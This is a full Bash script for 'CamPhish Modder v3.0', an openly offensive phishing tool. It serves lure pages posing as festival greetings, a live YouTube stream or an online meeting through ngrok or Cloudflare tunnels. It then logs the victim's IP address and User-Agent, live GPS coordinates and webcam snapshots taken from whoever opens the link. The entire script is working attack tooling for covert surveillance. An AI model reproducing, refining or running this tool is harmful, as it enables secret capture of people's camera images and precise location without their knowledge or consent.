#!/bin/bash

# ============================================================
#
#   CamPhish Modder v3.0 - Stable Edition
#   Reworked for stability, improved logging & clean ASCII layout
#
# ============================================================

# ---------- Color Palette ----------
RESET='\e[0m'
BOLD='\e[1m'
DIM='\e[2m'
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
WHITE='\e[1;97m'
GRAY='\e[0;37m'
ORANGE='\e[38;5;208m'
PINK='\e[38;5;205m'
LIME='\e[38;5;118m'
SKY='\e[38;5;117m'
PURPLE='\e[38;5;141m'
GOLD='\e[38;5;220m'

# ---------- OS Detection ----------
windows_mode=false
if [[ "$(uname -a 2>/dev/null)" == *"MINGW"* ]] || [[ "$(uname -a 2>/dev/null)" == *"MSYS"* ]] || [[ "$(uname -a 2>/dev/null)" == *"CYGWIN"* ]]; then
    windows_mode=true
fi

termux_mode=false
if [[ "$(uname -o 2>/dev/null)" == *"Android"* ]] || [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]] || [[ -f "/data/data/com.termux/files/usr/bin/termux-info" ]]; then
    termux_mode=true
fi

PORT=3333

# ---------- UI Helper Functions ----------
msg_ok()    { printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}%s${RESET}\n" "$1"; }
msg_info()  { printf "${CYAN}[${WHITE}*${CYAN}]${RESET} ${SKY}%s${RESET}\n" "$1"; }
msg_warn()  { printf "${YELLOW}[${WHITE}!${YELLOW}]${RESET} ${GOLD}%s${RESET}\n" "$1"; }
msg_error() { printf "${RED}[${WHITE}x${RED}]${RESET} ${PINK}%s${RESET}\n" "$1"; }
msg_hit()   { printf "${MAGENTA}[${WHITE}»${MAGENTA}]${RESET} ${WHITE}%s${RESET}: ${CYAN}%s${RESET}\n" "$1" "$2"; }

trap 'printf "\n"; stop' INT TERM

banner() {
    clear
    printf "${GREEN} _______ _______ _______ ${WHITE}_______ _________ _______ ${RESET}\n"
    printf "${GREEN}(  ____ (  ___  )(  ____  )${WHITE}(  ____  )\__   __/(  ____  )${RESET}\n"
    printf "${GREEN}| (    /| (   ) || (    ) |${WHITE}| (    ) |   ) (   | (    /|${RESET}\n"
    printf "${GREEN}| |     | (___) || (____) |${WHITE}| (____) |   | |   | (_____ ${RESET}\n"
    printf "${GREEN}| |     |  ___  ||  ____  )${WHITE}|  ____  |   | |   (_____  )${RESET}\n"
    printf "${GREEN}| |     | (   ) || (    ) |${WHITE}| (    ) |   | |         ) |${RESET}\n"
    printf "${GREEN}| (____/| )   ( || )____) |${WHITE}| )    ( |___) (___/\____) |${RESET}\n"
    printf "${GREEN}(_______/|/     \||_______/ ${WHITE}|/     \|\________/\_______)${RESET}\n"
    printf "         ${GOLD}CamPhish Modder Ver 3.0 - Stable Edition${RESET}\n\n"
}

dependencies() {
    local missing=0
    for cmd in php curl wget unzip; do
        if ! command -v "$cmd" > /dev/null 2>&1; then
            msg_error "Required tool '$cmd' is not installed."
            missing=1
        fi
    done

    if [[ $missing -eq 1 ]]; then
        msg_warn "Please install missing packages via: apt-get -y install php curl wget unzip"
        exit 1
    fi

    if ! command -v ps > /dev/null 2>&1; then
        msg_warn "'ps' command not found — process management will use fallback methods."
    fi
}

escape_sed() {
    printf '%s' "$1" | sed -e 's/[/&+\|]/\\&/g'
}

stop() {
    msg_warn "Stopping active services..."
    if [[ "$windows_mode" == true ]]; then
        taskkill /F /IM "ngrok.exe" 2>/dev/null
        taskkill /F /IM "php.exe" 2>/dev/null
        taskkill /F /IM "cloudflared.exe" 2>/dev/null
    else
        if command -v pkill > /dev/null 2>&1; then
            pkill -f "cloudflared.*$PORT" 2>/dev/null
            pkill -f "ngrok.*$PORT" 2>/dev/null
        fi

        if command -v fuser > /dev/null 2>&1; then
            fuser -k "$PORT/tcp" 2>/dev/null
        else
            local pids
            pids=$(ps aux 2>/dev/null | grep "[p]hp.*$PORT" | awk '{print $2}')
            if [[ -n "$pids" ]]; then
                kill -9 $pids 2>/dev/null
            else
                local php_pids
                php_pids=$(ps aux 2>/dev/null | grep "[p]hp -S" | awk '{print $2}')
                [[ -n "$php_pids" ]] && kill -9 $php_pids 2>/dev/null
            fi
        fi
    fi
    msg_ok "Services stopped. See you next time! — ${BOLD}CamPhish Modder${RESET}"
    exit 0
}

cleanup_stale() {
    rm -f ip.txt Log.log LocationLog.log LocationError.log current_location.txt \
          .cloudflared.log index.php index2.html index3.html sendlink .seen_* 2>/dev/null
}

catch_ip() {
    [[ -f "ip.txt" ]] || return 1
    local ip ua
    ip=$(grep -a 'IP:' ip.txt 2>/dev/null | head -n 1 | cut -d " " -f2 | tr -d '\r\n')
    ua=$(grep -a 'User-Agent:' ip.txt 2>/dev/null | head -n 1 | cut -d ":" -f2- | sed 's/^ *//;s/\r//g')
    
    [[ -z "$ip" ]] && ip="(unknown)"
    msg_hit "Target IP" "$ip"
    [[ -n "$ua" ]] && msg_hit "User-Agent" "$ua"

    {
        echo "===== $(date '+%Y-%m-%d %H:%M:%S') ====="
        cat ip.txt
        echo ""
    } >> saved.ip.txt 2>/dev/null
}

catch_location() {
    if [[ -f "current_location.txt" ]]; then
        msg_ok "Received Live GPS Data:"
        grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" \
            current_location.txt 2>/dev/null | while IFS= read -r line; do
            printf "  ${CYAN}»${RESET} ${WHITE}%s${RESET}\n" "$line"
        done
        printf "\n"
        
        cat current_location.txt >> saved.locations.txt 2>/dev/null
        mv current_location.txt current_location.bak 2>/dev/null
    fi

    local loc_file
    loc_file=$(ls -t location_*.txt 2>/dev/null | head -n 1)
    if [[ -n "$loc_file" && -f "$loc_file" ]]; then
        local lat lon acc maps_link
        lat=$(grep -a 'Latitude:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
        lon=$(grep -a 'Longitude:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
        acc=$(grep -a 'Accuracy:' "$loc_file" 2>/dev/null | head -n 1 | awk '{print $2}' | tr -d '\r')
        maps_link=$(grep -a 'Google Maps:' "$loc_file" 2>/dev/null | head -n 1 | sed 's/.*Google Maps: *//;s/\r//g')

        [[ -n "$lat" ]] && msg_hit "Latitude" "$lat"
        [[ -n "$lon" ]] && msg_hit "Longitude" "$lon"
        [[ -n "$acc" ]] && msg_hit "Accuracy" "${acc} meters"
        [[ -n "$maps_link" ]] && msg_hit "Google Maps" "$maps_link"

        mkdir -p saved_locations 2>/dev/null
        mv "$loc_file" saved_locations/ 2>/dev/null
        msg_ok "Location log saved to saved_locations/$(basename "$loc_file")"
    fi
}

catch_cam() {
    local f
    for f in cam*.png; do
        [[ -e "$f" ]] || continue
        [[ -f ".seen_$f" ]] && continue
        msg_hit "Camera Image Captured" "$f"
        touch ".seen_$f" 2>/dev/null
    done

    if [[ -f "Log.log" ]]; then
        msg_ok "New image payload captured successfully!"
        rm -f Log.log
    fi
}

checkfound() {
    mkdir -p saved_locations 2>/dev/null
    printf "\n"
    msg_info "Waiting for target interaction... ${GRAY}(Press Ctrl+C to exit)${RESET}"
    printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}GPS Location Tracking :${RESET} ${BOLD}${LIME}ACTIVE${RESET}\n"
    printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Camera Capture Status :${RESET} ${BOLD}${LIME}ACTIVE${RESET}\n"

    while true; do
        if [[ -f "ip.txt" ]]; then
            printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}Target opened the link!${RESET}\n"
            catch_ip
            rm -f ip.txt
        fi

        if [[ -f "current_location.txt" ]] || ls location_*.txt > /dev/null 2>&1; then
            printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}GPS location data received!${RESET}\n"
            catch_location
        fi

        if [[ -f "LocationLog.log" ]]; then
            printf "\n${LIME}[${WHITE}+${LIME}]${RESET} ${BOLD}${WHITE}GPS location log received!${RESET}\n"
            catch_location
            rm -f LocationLog.log
        fi

        [[ -f "LocationError.log" ]] && rm -f LocationError.log

        if [[ -f "Log.log" ]] || ls cam*.png > /dev/null 2>&1; then
            catch_cam
        fi

        sleep 0.5
    done
}

start_php_server() {
    if command -v fuser > /dev/null 2>&1; then
        fuser -k "$PORT/tcp" 2>/dev/null
    fi

    msg_info "Starting local PHP server on port $PORT..."
    if [[ "$termux_mode" == true ]]; then
        php -S 0.0.0.0:"$PORT" > /dev/null 2>&1 &
    else
        php -S 127.0.0.1:"$PORT" > /dev/null 2>&1 &
    fi
    sleep 2

    if ! ps aux 2>/dev/null | grep -q "[p]hp.*$PORT"; then
        if ! curl -s -m 3 "http://127.0.0.1:$PORT/" > /dev/null 2>&1; then
            msg_error "Failed to start PHP server. Ensure port $PORT is free."
            return 1
        fi
    fi
    msg_ok "PHP server successfully started."
}

get_cloudflare_link() {
    local tries=0 link=""
    while [[ $tries -lt 15 ]]; do
        link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' .cloudflared.log 2>/dev/null | head -n 1)
        [[ -n "$link" ]] && break
        sleep 2
        tries=$((tries + 1))
    done
    printf '%s' "$link"
}

get_ngrok_link() {
    local link=""
    link=$(curl -s -m 5 -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -oE 'https://[^/"'\'']+\.ngrok(-free)?\.(app|io|dev)' 2>/dev/null | head -n 1)
    printf '%s' "$link"
}

build_payload() {
    local link="$1"
    local esc_link
    esc_link=$(escape_sed "$link")

    if [[ -z "$link" ]]; then
        msg_error "Tunnel URL is missing — unable to generate payload."
        exit 1
    fi

    sed "s+forwarding_link+$esc_link+g" template.php > index.php 2>/dev/null

    if [[ "${option_tem:-1}" -eq 1 ]]; then
        local esc_fest
        esc_fest=$(escape_sed "$fest_name")
        sed "s+forwarding_link+$esc_link+g" festivalwishes.html > index3.html 2>/dev/null
        sed "s+fes_name+$esc_fest+g" index3.html > index2.html 2>/dev/null
    elif [[ "${option_tem:-1}" -eq 2 ]]; then
        local esc_yt
        esc_yt=$(escape_sed "$yt_video_ID")
        sed "s+forwarding_link+$esc_link+g" LiveYTTV.html > index3.html 2>/dev/null
        sed "s+live_yt_tv+$esc_yt+g" index3.html > index2.html 2>/dev/null
    else
        sed "s+forwarding_link+$esc_link+g" OnlineMeeting.html > index2.html 2>/dev/null
    fi

    rm -f index3.html
    if [[ ! -f "index.php" || ! -f "index2.html" ]]; then
        msg_error "Payload generation failed!"
        exit 1
    fi
}

cloudflare_tunnel() {
    local bin="./cloudflared"
    [[ "$windows_mode" == true ]] && bin="./cloudflared.exe"

    if [[ ! -e "$bin" ]]; then
        command -v unzip > /dev/null 2>&1 || { msg_error "Unzip command required."; exit 1; }
        msg_info "Downloading Cloudflared binary..."
        local arch os
        arch=$(uname -m); os=$(uname -s)
        msg_info "Detected OS: $os | Arch: $arch"

        if [[ "$windows_mode" == true ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1 || { msg_error "Download failed."; exit 1; }
            chmod +x cloudflared.exe 2>/dev/null
        elif [[ "$os" == "Darwin" ]]; then
            if [[ "$arch" == "arm64" ]]; then
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
            else
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
            fi
            tar -xzf cloudflared.tgz > /dev/null 2>&1; chmod +x cloudflared; rm -f cloudflared.tgz
        else
            case "$arch" in
                x86_64)         wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
                i686|i386)      wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 ;;
                aarch64|arm64)  wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1 ;;
                armv7l|armv6l)  wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1 ;;
                *)              wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1 ;;
            esac
            chmod +x cloudflared
        fi
    fi

    start_php_server || exit 1
    msg_info "Initializing Cloudflared Tunnel..."
    rm -f .cloudflared.log

    $bin tunnel --url "127.0.0.1:$PORT" --logfile .cloudflared.log > /dev/null 2>&1 &
    sleep 3

    local link
    link=$(get_cloudflare_link)
    if [[ -z "$link" ]]; then
        msg_error "Failed to resolve Direct Link. Troubleshooting tips:"
        printf "  ${CYAN}[*]${RESET} ${YELLOW}Cloudflare service might be temporarily unavailable.${RESET}\n"
        printf "  ${CYAN}[*]${RESET} ${YELLOW}Stale process found — try running: pkill -f cloudflared${RESET}\n"
        printf "  ${CYAN}[*]${RESET} ${YELLOW}Android Users: Ensure Mobile Hotspot is enabled.${RESET}\n"
        exit 1
    else
        msg_hit "Direct Link" "$link"
    fi

    build_payload "$link"
    checkfound
}

ngrok_server() {
    local bin="./ngrok"
    [[ "$windows_mode" == true ]] && bin="./ngrok.exe"

    if [[ ! -e "$bin" ]]; then
        command -v unzip > /dev/null 2>&1 || { msg_error "Unzip command required."; exit 1; }
        msg_info "Downloading Ngrok binary..."
        local arch os url=""
        arch=$(uname -m); os=$(uname -s)

        if [[ "$windows_mode" == true ]]; then
            url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
        elif [[ "$os" == "Darwin" ]]; then
            [[ "$arch" == "arm64" ]] && url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip" || url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
        else
            case "$arch" in
                x86_64)         url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" ;;
                i686|i386)      url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip" ;;
                aarch64|arm64)  url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" ;;
                armv7l|armv6l)  url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip" ;;
                *)              url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" ;;
            esac
        fi

        wget --no-check-certificate "$url" -O ngrok.zip > /dev/null 2>&1 || { msg_error "Download failed."; exit 1; }
        unzip -o ngrok.zip > /dev/null 2>&1
        chmod +x "$bin" 2>/dev/null
        rm -f ngrok.zip
    fi

    local ngrok_cfg="$HOME/.ngrok2/ngrok.yml"
    [[ "$windows_mode" == true ]] && ngrok_cfg="$USERPROFILE\\.ngrok2\\ngrok.yml"

    if [[ -f "$ngrok_cfg" ]]; then
        printf "${GOLD}[${WHITE}*${GOLD}]${RESET} ${WHITE}Existing Ngrok config found.${RESET}\n"
        read -rp "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Change authtoken? [y/N]: ${RESET}")" chg_token
        if [[ "$chg_token" =~ ^[Yy]$ ]]; then
            read -rp "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Enter new Ngrok authtoken: ${RESET}")" ngrok_auth
            [[ -n "$ngrok_auth" ]] && $bin authtoken "$ngrok_auth" > /dev/null 2>&1 && msg_ok "Authtoken updated."
        fi
    else
        read -rp "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Enter Ngrok authtoken: ${RESET}")" ngrok_auth
        [[ -n "$ngrok_auth" ]] && $bin authtoken "$ngrok_auth" > /dev/null 2>&1
    fi

    start_php_server || exit 1
    msg_info "Starting Ngrok tunnel..."
    $bin http "$PORT" > /dev/null 2>&1 &
    sleep 8

    local link
    link=$(get_ngrok_link)
    if [[ -z "$link" ]]; then
        sleep 4
        link=$(get_ngrok_link)
    fi

    if [[ -z "$link" ]]; then
        msg_error "Failed to resolve Direct Link via Ngrok."
        printf "  ${CYAN}[*]${RESET} ${YELLOW}Verify that your authtoken is valid.${RESET}\n"
        printf "  ${CYAN}[*]${RESET} ${YELLOW}Stale process found — try running: pkill -f ngrok${RESET}\n"
        exit 1
    else
        msg_hit "Direct Link" "$link"
    fi

    build_payload "$link"
    checkfound
}

select_template() {
    while true; do
        printf "\n${GREEN}${BOLD}[+]----[ Select Template ]----[+]${RESET}\n"
        printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${WHITE}Festival Wishing${RESET}\n"
        printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${WHITE}Live YouTube TV${RESET}\n"
        printf "${GREEN}[${WHITE}03${GREEN}]${RESET} ${WHITE}Online Meeting${RESET}\n"
        
        read -rp "$(printf "${GREEN}${BOLD}[+] Choose a template [Default: 1]: ${RESET}")" option_tem
        option_tem="${option_tem:-1}"
        option_tem=$(printf '%s' "$option_tem" | tr -d '[:space:]')

        if ! [[ "$option_tem" =~ ^[1-3]$ ]]; then
            msg_error "Invalid selection (Choose 1-3)."
            continue
        fi
        break
    done

    if [[ "$option_tem" -eq 1 ]]; then
        read -rp "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Enter Festival Name: ${RESET}")" fest_name
        fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [[ -z "$fest_name" ]] && fest_name="Festival"
    elif [[ "$option_tem" -eq 2 ]]; then
        while true; do
            read -rp "$(printf "${GREEN}[${WHITE}+${GREEN}]${RESET} ${WHITE}Enter YouTube Video ID/URL: ${RESET}")" yt_video_ID
            yt_video_ID=$(printf '%s' "$yt_video_ID" | tr -d '[:space:]')

            if [[ "$yt_video_ID" =~ v=([^&]+) ]]; then
                yt_video_ID="${BASH_REMATCH[1]}"
            fi

            if [[ "$yt_video_ID" =~ ^[A-Za-z0-9_-]{6,20}$ ]]; then
                break
            else
                msg_error "Invalid Video ID (e.g., dQw4w9WgXcQ)."
            fi
        done
    fi
}

camphish() {
    rm -f sendlink 2>/dev/null
    cleanup_stale
    
    printf "\n${GREEN}${BOLD}[+]----[ Select Tunneling Service ]----[+]${RESET}\n"
    printf "${GREEN}[${WHITE}01${GREEN}]${RESET} ${WHITE}Ngrok${RESET}\n"
    printf "${GREEN}[${WHITE}02${GREEN}]${RESET} ${WHITE}Cloudflare Tunnel${RESET}\n"

    local option_server
    read -rp "$(printf "${GREEN}${BOLD}[+] Choose port forwarding option [Default: 1]: ${RESET}")" option_server
    option_server="${option_server:-1}"
    option_server=$(printf '%s' "$option_server" | tr -d '[:space:]')

    select_template

    case "$option_server" in
        1) ngrok_server ;;
        2) cloudflare_tunnel ;;
        *) msg_error "Invalid choice!"; sleep 1; camphish ;;
    esac
}

# ---------- Execution Flow ----------
banner
dependencies
camphish
